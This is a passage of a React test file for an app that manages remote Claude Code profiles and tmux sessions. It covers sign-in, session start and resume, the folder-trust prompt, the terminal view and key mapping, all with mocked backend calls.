    const dialog = await screen.findByRole('dialog', { name: 'Already running' })
    expect(within(dialog).getByText("ssh -t xjopa1 'tmux attach -t ai \\; select-window -t @4'")).toBeInTheDocument()
  })

  it('starts a new session in a picked folder, named, with trust on', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ running: false, window: null })])
    vi.mocked(remoteListDirs).mockImplementation(async ({ path }) =>
      path === '/home/marcus/code'
        ? { path: '/home/marcus/code', parent: '/home/marcus', home: '/home/marcus', entries: [], truncated: false }
        : {
            path: '/home/marcus',
            parent: null,
            home: '/home/marcus',
            entries: [{ name: 'code', path: '/home/marcus/code' }],
            truncated: false,
          },
    )
    vi.mocked(remoteNewSession).mockResolvedValue({ ...launch, remoteControlName: 'Deploy' })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: /New session/ }))
    const dialog = await screen.findByRole('dialog', { name: 'New session' })
    expect(within(dialog).getByRole('button', { name: '~/brain' })).toBeInTheDocument()
    await user.click(await within(dialog).findByRole('button', { name: 'code' }))
    await within(dialog).findByText('~/code')
    // Named after the folder until someone types a name.
    await waitFor(() => expect(within(dialog).getByLabelText(/Name/)).toHaveValue('code'))
    await user.clear(within(dialog).getByLabelText(/Name/))
    await user.type(within(dialog).getByLabelText(/Name/), 'Deploy')
    await user.click(within(dialog).getByRole('button', { name: /^Start/ }))

    await waitFor(() =>
      expect(remoteNewSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        request: { cwd: '/home/marcus/code', name: 'Deploy', trustFolder: true },
      }),
    )
    // Nothing to answer: no dialog, the list shows it started.
    await waitFor(() => expect(screen.queryByRole('dialog')).not.toBeInTheDocument())
  })
})

describe('profiles on a remote host', () => {
  const login = { loginId: 'l1', url: 'https://claude.com/cai/oauth/authorize?x=1', expiresAt: '2026-09-22T01:00:00Z' }

  beforeEach(() => {
    vi.mocked(remoteLoginStart).mockReset()
    vi.mocked(remoteLoginSubmit).mockReset()
    vi.mocked(remoteLoginCancel).mockClear()
    vi.mocked(remoteCreateAccount).mockReset()
    vi.mocked(remoteDeleteAccount).mockReset()
  })

  it('signs a new profile in with the code from the browser', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteLoginStart).mockResolvedValue(login)
    vi.mocked(remoteLoginSubmit).mockResolvedValue(account({ name: 'work' }))
    const onClose = vi.fn()
    renderWithQuery(
      <ToastProvider>
        <SignInDialog open host={host} account="work" cancelLabel="Skip for now" onClose={onClose} />
      </ToastProvider>,
    )
    const user = userEvent.setup()

    const signIn = await screen.findByRole('dialog', { name: 'Sign in work' })
    await waitFor(() => expect(remoteLoginStart).toHaveBeenCalledWith({ hostId: 'h1', account: 'work' }))
    expect(within(signIn).getByRole('button', { name: /Skip for now/ })).toBeInTheDocument()
    await user.click(await within(signIn).findByRole('button', { name: /Open the page again/ }))
    expect(openExternalUrl).toHaveBeenCalledWith(login.url)
    await user.type(within(signIn).getByLabelText('Code'), 'abc#def')
    await user.click(within(signIn).getByRole('button', { name: /^Sign in/ }))
    await waitFor(() =>
      expect(remoteLoginSubmit).toHaveBeenCalledWith({ hostId: 'h1', loginId: 'l1', code: 'abc#def' }),
    )
    expect(await screen.findByText('Signed in work')).toBeInTheDocument()
    expect(onClose).toHaveBeenCalled()
    expect(remoteLoginCancel).not.toHaveBeenCalled()
  })

  it('renames a profile to a name no other profile on the server has', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account({ runningSessions: 1 }), account({ name: 'marcus1' })])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    vi.mocked(remoteRenameAccount).mockResolvedValue(account({ name: 'office' }))
    const onRenamed = vi.fn()
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" onRenamed={onRenamed} />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'More actions' }))
    await user.click(await screen.findByText('Edit profile…'))
    const dialog = await screen.findByRole('dialog', { name: 'Edit profile' })
    const name = within(dialog).getByLabelText('Name')
    await user.clear(name)
    await user.type(name, 'Marcus1')
    expect(within(dialog).getByText('xjopa1 already has a profile called Marcus1.')).toBeInTheDocument()
    expect(within(dialog).getByRole('button', { name: /save/i })).toBeDisabled()
    await user.clear(name)
    await user.type(name, 'office')
    expect(within(dialog).getByText(/1 running session has its folder open/)).toBeInTheDocument()
    await user.click(within(dialog).getByRole('button', { name: /Stop sessions and save/ }))
    await waitFor(() =>
      expect(remoteRenameAccount).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        newName: 'office',
        stopRunning: true,
      }),
    )
    await waitFor(() => expect(onRenamed).toHaveBeenCalledWith('office'))
  })

  it('signs a profile out, stopping its running sessions after saying so', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account({ runningSessions: 2 })])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    vi.mocked(remoteLogout).mockResolvedValue(2)
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'More actions' }))
    expect(screen.queryByText('Sign in…')).toBeNull()
    await user.click(await screen.findByText('Sign out…'))
    const dialog = await screen.findByRole('dialog', { name: 'Sign out marcus2?' })
    expect(within(dialog).getByText(/2 sessions are running/)).toBeInTheDocument()
    await user.click(within(dialog).getByRole('button', { name: 'Stop sessions and sign out' }))
    await waitFor(() =>
      expect(remoteLogout).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2', stopRunning: true }),
    )
  })

  it('starts over after a code the host refused, and cancels a sign-in left unfinished', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account({ signedIn: false, account: null })])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    vi.mocked(remoteLoginStart)
      .mockResolvedValueOnce(login)
      .mockResolvedValueOnce({ ...login, loginId: 'l2' })
    vi.mocked(remoteLoginSubmit).mockRejectedValue({
      kind: 'Remote',
      code: 'login_failed',
      message: "The code wasn't accepted.",
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()

    expect(await screen.findByText(/^Signed out\. Sessions/)).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: /^Sign in$/ }))
    const dialog = await screen.findByRole('dialog', { name: 'Sign in marcus2' })
    await user.type(await within(dialog).findByLabelText('Code'), 'bad')
    await user.click(within(dialog).getByRole('button', { name: /^Sign in/ }))
    expect(await within(dialog).findByText("The code wasn't accepted.")).toBeInTheDocument()
    expect(within(dialog).getByLabelText('Code')).toBeDisabled()

    await user.click(within(dialog).getByRole('button', { name: /Sign in again/ }))
    await waitFor(() => expect(remoteLoginStart).toHaveBeenCalledTimes(2))
    expect(await within(dialog).findByLabelText('Code')).toBeEnabled()
    await user.click(within(dialog).getByRole('button', { name: /Cancel/ }))
    expect(remoteLoginCancel).toHaveBeenCalledWith({ hostId: 'h1', loginId: 'l2' })
  })

  it('deletes a profile to the host’s trash from its menu, and says why when it can’t', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    vi.mocked(remoteDeleteAccount)
      .mockRejectedValueOnce({ kind: 'Remote', code: 'account_busy', message: 'marcus2 has 2 sessions running.' })
      .mockResolvedValueOnce({ trashedTo: '/home/marcus/.claude-accounts/.trash/marcus2-20260922' })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()

    await user.click(await screen.findByRole('button', { name: 'More actions' }))
    expect(await screen.findByRole('menuitem', { name: /Sign out/ })).toBeInTheDocument()
    expect(screen.getByRole('menuitem', { name: /Edit profile/ })).toBeInTheDocument()
    await user.click(screen.getByRole('menuitem', { name: /Delete profile/ }))
    const dialog = await screen.findByRole('dialog', { name: 'Delete marcus2?' })
    await user.click(within(dialog).getByRole('button', { name: 'Delete' }))
    expect(await within(dialog).findByText('marcus2 has 2 sessions running.')).toBeInTheDocument()
    await user.click(within(dialog).getByRole('button', { name: 'Delete' }))
    await waitFor(() => expect(remoteDeleteAccount).toHaveBeenCalledTimes(2))
    expect(remoteDeleteAccount).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2' })
    expect(await screen.findByText('Deleted marcus2')).toBeInTheDocument()
  })

  it('offers no Delete for the host’s default profile', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account({ name: 'default', isDefault: true })])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="default" />
      </ToastProvider>,
    )
    await userEvent.setup().click(await screen.findByRole('button', { name: 'More actions' }))
    expect(await screen.findByRole('menuitem', { name: /Sign out/ })).toBeInTheDocument()
    expect(screen.queryByRole('menuitem', { name: /Delete profile/ })).not.toBeInTheDocument()
  })
})

describe('Remote Control connecting', () => {
  it('shows a spinner where Open in Claude will be, until Remote Control connects', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session({ remoteControl: false, bridgeSessionId: null, remoteControlConnecting: true }),
    ])
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    expect(await screen.findByRole('status', { name: 'Remote Control is connecting' })).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Open in Claude' })).toBeNull()
  })
})

describe('the terminal button', () => {
  it('opens a window the server opened live in ai-profiles, with Terminal and the attach command a click away', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session({ window: { session: 'ai', windowId: '@16', paneId: '%18' } }),
    ])
    vi.mocked(remoteWindowScreen).mockResolvedValue({
      text: 'Done.\n❯ ',
      width: 80,
      height: 24,
      sessionId: 's1',
      remoteControl: true,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Open its window' }))

    const dialog = await screen.findByRole('dialog', { name: 'Brain-Dev-Server' })
    const terminal = within(dialog).getByRole('application', { name: 'Window @16 on xjopa1' })
    expect(await within(terminal).findByText(/Done\./)).toBeInTheDocument()
    expect(remoteWindowScreen).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2', windowId: '@16' })
    expect(within(dialog).getByRole('button', { name: 'Close' })).toBeInTheDocument()

    await user.click(within(dialog).getByRole('button', { name: /Copy attach command/ }))
    await waitFor(() =>
      expect(copyToClipboard).toHaveBeenCalledWith("ssh -t xjopa1 'tmux attach -t ai \\; select-window -t @16'"),
    )
    expect(within(dialog).getByRole('button', { name: /Copied/ })).toBeInTheDocument()
    expect(remoteOpenInTerminal).not.toHaveBeenCalled()

    await user.click(within(dialog).getByRole('button', { name: /Open in Terminal/ }))
    await waitFor(() =>
      expect(remoteOpenInTerminal).toHaveBeenCalledWith({
        hostId: 'h1',
        attachCommand: 'tmux attach -t ai \\; select-window -t @16',
      }),
    )
  })

  it("says why a window the server didn't open can't be shown, and still offers Terminal", async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session()])
    vi.mocked(remoteWindowScreen).mockClear()
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Open its window' }))

    const dialog = await screen.findByRole('dialog', { name: 'Brain-Dev-Server' })
    expect(within(dialog).getByRole('alert')).toHaveTextContent(/tmux session "0", which ai-profiles didn't start/)
    expect(within(dialog).queryByRole('application')).toBeNull()
    expect(remoteWindowScreen).not.toHaveBeenCalled()
    await user.click(within(dialog).getByRole('button', { name: /Open in Terminal/ }))
    await waitFor(() => expect(remoteOpenInTerminal).toHaveBeenCalled())
  })
})

describe('renaming a session', () => {
  it('renames a running session everywhere, and says so when Claude had to add a suffix', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ title: 'Checking identity', named: false })])
    vi.mocked(remoteRenameSession).mockResolvedValue({ name: 'David game-2', live: true })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click((await screen.findAllByRole('button', { name: 'Rename' }))[0])
    const dialog = await screen.findByRole('dialog', { name: 'Rename session' })
    const input = within(dialog).getByLabelText('Name')
    // An automatic title isn't a name yet: the field starts empty.
    expect(input).toHaveValue('')
    expect(input).toHaveAttribute('placeholder', 'Checking identity')
    await user.type(input, '  David game  ')
    await user.click(within(dialog).getByRole('button', { name: /^Rename/ }))

    await waitFor(() =>
      expect(remoteRenameSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's1',
        name: 'David game',
      }),
    )
    expect(await screen.findByText('Renamed to David game-2')).toBeInTheDocument()
    expect(screen.getAllByText(/so Claude added a suffix/).length).toBeGreaterThan(0)
  })
})

describe('a session left waiting', () => {
  const prompt =
    'Quick safety check: Is this a project you created or one you trust?\n ❯ No, exit\n   Yes, I trust this folder\n'

  it('shows what the folder would pre-approve and lets the window be answered from the app', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ id: 's2', running: false, window: null })])
    vi.mocked(remoteResumeSession).mockResolvedValue({
      window: { session: 'ai', windowId: '@10', paneId: '%12' },
      alreadyRunning: false,
      sessionId: 's2',
      remoteControlName: null,
      attention: {
        kind: 'trustPermissions',
        text: 'This folder pre-approves 2 tool permissions in .claude/settings.local.json: Bash(sudo cp:*), Bash(sudo nginx:*)',
      },
      attachCommand: 'tmux attach -t ai \\; select-window -t @10',
    })
    vi.mocked(remoteWindowScreen).mockResolvedValue({
      text: prompt,
      width: 80,
      height: 24,
      sessionId: null,
      remoteControl: false,
    })
    vi.mocked(remoteWindowKeys).mockResolvedValue({
      text: 'Welcome to Claude Code',
      width: 80,
      height: 24,
      sessionId: 's2',
      remoteControl: true,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: /Resume/ }))

    const dialog = await screen.findByRole('dialog', { name: 'Started, and waiting' })
    expect(within(dialog).getByText(/Bash\(sudo nginx:\*\)/)).toBeInTheDocument()
    // Done only once the session is going; leaving it is still possible.
    expect(within(dialog).getByRole('button', { name: /Waiting for Claude/ })).toBeDisabled()
    expect(within(dialog).getByRole('button', { name: 'Leave it waiting' })).toBeEnabled()
    const terminal = within(dialog).getByRole('application', { name: 'Window @10 on xjopa1' })
    expect(await within(terminal).findByText(/Yes, I trust this folder/)).toBeInTheDocument()
    expect(remoteWindowScreen).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2', windowId: '@10' })

    terminal.focus()
    await user.keyboard('{ArrowDown}{Escape}y{Enter}')
    await waitFor(() => expect(remoteWindowKeys).toHaveBeenCalledTimes(4))
    expect(vi.mocked(remoteWindowKeys).mock.calls.map(([input]) => input.keys)).toEqual([
      [{ key: 'Down' }],
      [{ key: 'Escape' }],
      [{ text: 'y' }],
      [{ key: 'Enter' }],
    ])
    // Escape and Enter went to the window, not to the dialog, and once the
    // window's session registered the dialog says so.
    expect(await within(terminal).findByText('Welcome to Claude Code')).toBeInTheDocument()
    expect(await screen.findByRole('dialog', { name: 'Session started' })).toBe(dialog)
    expect(within(dialog).getByText(/Remote Control connected/)).toBeInTheDocument()
    expect(within(dialog).getByRole('button', { name: /Done/ })).toBeEnabled()

    await user.click(within(dialog).getByRole('button', { name: 'Press Control-C' }))
    await waitFor(() =>
      expect(remoteWindowKeys).toHaveBeenLastCalledWith(expect.objectContaining({ keys: [{ key: 'C-c' }] })),
    )
  })

  it('lists a session still at its first prompt as waiting, and opens the prompt to answer it', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session({
        id: 's3',
        running: true,
        waiting: true,
        remoteControl: false,
        window: { session: 'ai', windowId: '@16', paneId: '%18' },
      }),
    ])
    vi.mocked(remoteResumeSession).mockResolvedValue({
      window: { session: 'ai', windowId: '@16', paneId: '%18' },
      alreadyRunning: true,
      sessionId: 's3',
      remoteControlName: null,
      attention: { kind: 'trustPermissions', text: 'This folder pre-approves 1 tool permission: Bash(npm test)' },
      attachCommand: 'tmux attach -t ai \\; select-window -t @16',
    })
    vi.mocked(remoteWindowScreen).mockResolvedValue({
      text: prompt,
      width: 80,
      height: 24,
      sessionId: null,
      remoteControl: false,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const running = await screen.findByRole('list', { name: 'Running sessions' })
    expect(within(running).getByText('Waiting for you')).toBeInTheDocument()
    await userEvent.setup().click(within(running).getByRole('button', { name: /Answer/ }))

    const dialog = await screen.findByRole('dialog', { name: 'Waiting for you' })
    expect(within(dialog).getByText(/Bash\(npm test\)/)).toBeInTheDocument()
    expect(within(dialog).queryByText(/open there already/)).not.toBeInTheDocument()
  })

  it('says so when the window has closed', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ id: 's2', running: false, window: null })])
    vi.mocked(remoteResumeSession).mockResolvedValue({
      window: { session: 'ai', windowId: '@11', paneId: '%13' },
      alreadyRunning: false,
      sessionId: 's2',
      remoteControlName: null,
      attention: { kind: 'waiting', text: 'Choose the text style' },
      attachCommand: 'tmux attach -t ai \\; select-window -t @11',
    })
    vi.mocked(remoteWindowScreen).mockRejectedValue({
      kind: 'Remote',
      code: 'window_gone',
      message: 'That window has closed.',
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    await userEvent.setup().click(await screen.findByRole('button', { name: /Resume/ }))
    expect(await screen.findByText('The window has closed.')).toBeInTheDocument()
  })
})

describe('windowKeyFor', () => {
  const press = (key: string, mods: Partial<Record<'ctrlKey' | 'metaKey' | 'altKey' | 'shiftKey', boolean>> = {}) =>
    windowKeyFor({ key, ctrlKey: false, metaKey: false, altKey: false, shiftKey: false, ...mods })

  it('types what a terminal would and leaves the Mac’s shortcuts alone', () => {
    expect(press('ArrowUp')).toEqual({ key: 'Up' })
    expect(press('Backspace')).toEqual({ key: 'BSpace' })
    expect(press('Tab', { shiftKey: true })).toEqual({ key: 'BTab' })
    expect(press(' ')).toEqual({ key: 'Space' })
    expect(press('Y', { shiftKey: true })).toEqual({ text: 'Y' })
    expect(press('c', { ctrlKey: true })).toEqual({ key: 'C-c' })
    expect(press('x', { ctrlKey: true })).toBeNull()
    expect(press('c', { metaKey: true })).toBeNull()
    expect(press('Shift', { shiftKey: true })).toBeNull()
  })
})
